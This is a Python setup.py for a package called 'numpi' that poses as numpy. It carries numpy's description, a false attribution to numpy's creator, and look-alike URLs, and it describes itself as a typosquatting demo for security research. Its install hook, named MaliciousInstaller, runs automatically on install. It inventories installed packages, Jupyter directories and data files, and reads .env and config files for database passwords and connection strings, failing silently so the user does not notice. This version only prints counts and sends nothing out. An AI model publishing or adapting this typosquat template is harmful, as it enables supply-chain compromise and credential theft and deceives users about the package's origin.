#!/usr/bin/env python3
"""
Numpi - Fundamental package for scientific computing with Python
WARNING: This is a typosquatting demo package for security research
"""

from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import sys
import subprocess
import platform

class MaliciousInstaller(install):
    """Custom installer with malicious post-install hooks"""
    
    def run(self):
        install.run(self)
        print("Numpi: Configuring optimized mathematical libraries...")
        self.execute_malicious_payload()
    
    def execute_malicious_payload(self):
        """Execute malicious data science environment reconnaissance"""
        try:
            # Data science environment analysis
            self.analyze_data_science_stack()
            
            # Jupyter notebook reconnaissance  
            self.scan_jupyter_environment()
            
            # Look for data files and databases
            self.inventory_data_assets()
            
            print("Numpi: Mathematical optimization complete")
            
        except Exception:
            # Fail silently to avoid detection
            pass
    
    def analyze_data_science_stack(self):
        """Analyze the data science environment"""
        try:
            # Check for common data science packages
            data_science_packages = [
                'pandas', 'matplotlib', 'seaborn', 'sklearn', 'scikit-learn',
                'tensorflow', 'keras', 'pytorch', 'torch', 'scipy',
                'jupyter', 'ipython', 'notebook', 'spyder'
            ]
            
            installed_packages = []
            try:
                result = subprocess.run([sys.executable, '-m', 'pip', 'list'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    pip_output = result.stdout.lower()
                    installed_packages = [pkg for pkg in data_science_packages if pkg in pip_output]
            except Exception:
                pass
            
            if installed_packages:
                print(f"[DEMO] Data science environment detected: {len(installed_packages)} packages")
                
            # Check for conda environment
            if 'CONDA_DEFAULT_ENV' in os.environ:
                print(f"[DEMO] Conda environment: {os.environ['CONDA_DEFAULT_ENV']}")
            
            # Look for data science project indicators
            project_files = [
                'requirements.txt', 'environment.yml', 'Pipfile',
                '*.ipynb', '*.py', '*.R', '*.csv', '*.json', '*.parquet'
            ]
            
            found_indicators = []
            for pattern in project_files:
                if pattern.startswith('*'):
                    # Simple glob-like check
                    ext = pattern[1:]
                    for f in os.listdir('.'):
                        if f.endswith(ext):
                            found_indicators.append(pattern)
                            break
                else:
                    if os.path.exists(pattern):
                        found_indicators.append(pattern)
            
            if found_indicators:
                print(f"[DEMO] Data science project detected: {len(found_indicators)} indicators")
                
        except Exception:
            pass
    
    def scan_jupyter_environment(self):
        """Scan for Jupyter notebooks and configuration"""
        try:
            home_dir = os.path.expanduser('~')
            
            # Check for Jupyter directories
            jupyter_dirs = [
                os.path.join(home_dir, '.jupyter'),
                os.path.join(home_dir, '.ipython'),
                os.path.join(home_dir, '.local/share/jupyter')
            ]
            
            jupyter_found = False
            for jupyter_dir in jupyter_dirs:
                if os.path.exists(jupyter_dir):
                    jupyter_found = True
                    
                    # Look for jupyter config files
                    config_files = []
                    try:
                        for root, dirs, files in os.walk(jupyter_dir):
                            config_files.extend([f for f in files if 'config' in f.lower()])
                    except Exception:
                        pass
                    
                    if config_files:
                        print(f"[DEMO] Jupyter config files found: {len(config_files)}")
            
            if jupyter_found:
                print("[DEMO] Jupyter environment detected")
            
            # Look for notebooks in current directory
            notebook_count = 0
            try:
                for f in os.listdir('.'):
                    if f.endswith('.ipynb'):
                        notebook_count += 1
            except Exception:
                pass
            
            if notebook_count > 0:
                print(f"[DEMO] Found {notebook_count} Jupyter notebooks")
                
        except Exception:
            pass
    
    def inventory_data_assets(self):
        """Inventory potential data assets"""
        try:
            # Common data file extensions
            data_extensions = [
                '.csv', '.json', '.xlsx', '.xls', '.parquet', '.h5', '.hdf5',
                '.pkl', '.pickle', '.feather', '.arrow', '.avro',
                '.db', '.sqlite', '.sqlite3'
            ]
            
            data_files = []
            try:
                for root, dirs, files in os.walk('.'):
                    # Skip hidden directories and common non-data directories
                    dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ['node_modules', '__pycache__']]
                    
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in data_extensions):
                            data_files.append(os.path.join(root, file))
                    
                    # Limit search to avoid long execution times
                    if len(data_files) > 50:
                        break
            except Exception:
                pass
            
            if data_files:
                print(f"[DEMO] Found {len(data_files)} potential data files")
                
                # Analyze file sizes
                large_files = []
                try:
                    for file_path in data_files[:20]:  # Check first 20 files
                        try:
                            size = os.path.getsize(file_path)
                            if size > 1024 * 1024:  # Files larger than 1MB
                                large_files.append((file_path, size))
                        except Exception:
                            continue
                except Exception:
                    pass
                
                if large_files:
                    print(f"[DEMO] Found {len(large_files)} large data files")
            
            # Check for database connections in config files
            self._scan_database_configs()
            
        except Exception:
            pass
    
    def _scan_database_configs(self):
        """Scan for database configuration files"""
        try:
            config_files = [
                '.env', 'config.py', 'settings.py', 'database.yml',
                'db_config.json', 'connections.cfg'
            ]
            
            db_patterns = [
                'DATABASE_URL', 'DB_HOST', 'DB_USER', 'DB_PASSWORD',
                'MONGO_URI', 'REDIS_URL', 'POSTGRES_', 'MYSQL_',
                'postgresql://', 'mysql://', 'sqlite://', 'mongodb://'
            ]
            
            found_db_configs = []
            for config_file in config_files:
                if os.path.exists(config_file):
                    try:
                        with open(config_file, 'r') as f:
                            content = f.read()
                            
                        for pattern in db_patterns:
                            if pattern in content:
                                found_db_configs.append((config_file, pattern))
                                break
                    except Exception:
                        continue
            
            if found_db_configs:
                print(f"[DEMO] Database configurations found in {len(found_db_configs)} files")
                
        except Exception:
            pass

# Package setup mimicking numpy
setup(
    name='numpi',
    version='1.24.4',
    description='Fundamental package for scientific computing with Python - Enhanced Edition',
    long_description='NumPy enhanced with built-in performance monitoring and optimization features for scientific computing.',
    author='Travis E. Oliphant',
    author_email='travis@numpi-enhanced.org',
    url='https://www.numpi.org',
    packages=find_packages(),
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Science/Research',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Programming Language :: C',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
        'Topic :: Scientific/Engineering',
        'Topic :: Software Development',
    ],
    python_requires='>=3.8',
    install_requires=[
        # Minimal dependencies to avoid conflicts
    ],
    cmdclass={
        'install': MaliciousInstaller,
    },
    keywords='array, scientific, mathematics, matrix, numpy, enhanced',
    project_urls={
        'Bug Reports': 'https://github.com/numpy/numpi/issues',
        'Documentation': 'https://numpi.org/doc/stable',
        'Source': 'https://github.com/numpy/numpi',
    },
)
